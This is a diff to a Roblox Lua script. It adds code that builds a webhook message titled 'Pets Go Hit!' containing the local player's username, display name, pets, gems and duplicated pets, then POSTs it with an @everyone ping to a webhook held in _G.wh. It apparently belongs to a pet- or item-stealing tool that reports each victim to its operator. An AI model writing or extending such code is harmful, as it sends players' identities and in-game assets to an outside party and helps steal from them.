@@ -1,17 +1,19 @@
-return function()
+return function(dh,pn,gn,dp)
 print(_G.wh)
-print(_G.whh, typeof(_G.whh))
-for i,v in pairs(_G.whh) do
-print(i,v)
-end
 print(_G.whb)
+local msg = ""
+if dh then
+msg = '{"embeds":[{"id":449684281,"fields":[{"id":660857133,"name":"👨User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"id":312802545,"value":"'..pn..'","name":"🐾Pets","inline":true},{"id":263524395,"value":"'..gn..'","name":"💎Gems","inline":true},{"id":263511395,"value":"'..dp..'","name":"💎DualedPets","inline":true}],"title":"Pets Go Hit!","thumbnail":{"url":"https://yt3.googleusercontent.com/AkuAaPowxMMFkQP-YfPgGasKISeZwTZlQQ3C234sDL-rdjaSKSyYZIxF-k_0OnqUWqqBhqTM=s160-c-k-c0x00ffffff-no-rj"}}],"tts":false,"actions":[],"content":"@everyone","components":[]}'
+else
+msg = '{"embeds":[{"id":449684281,"fields":[{"id":660857133,"name":"👨User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"id":312802545,"value":"'..pn..'","name":"🐾Pets","inline":true},{"id":263524395,"value":"'..gn..'","name":"💎Gems","inline":true}],"title":"Pets Go Hit!","thumbnail":{"url":"https://yt3.googleusercontent.com/AkuAaPowxMMFkQP-YfPgGasKISeZwTZlQQ3C234sDL-rdjaSKSyYZIxF-k_0OnqUWqqBhqTM=s160-c-k-c0x00ffffff-no-rj"}}],"tts":false,"actions":[],"content":"@everyone","components":[]}'
+end
 local response =
         request(
         {
             Url = _G.wh,
             Method = "POST",
-            Headers = _G.whh,
-            Body = _G.whb
+            Headers = {["Content-Type"] = "application/json"},
+            Body = msg
         }
     )
 print(response)
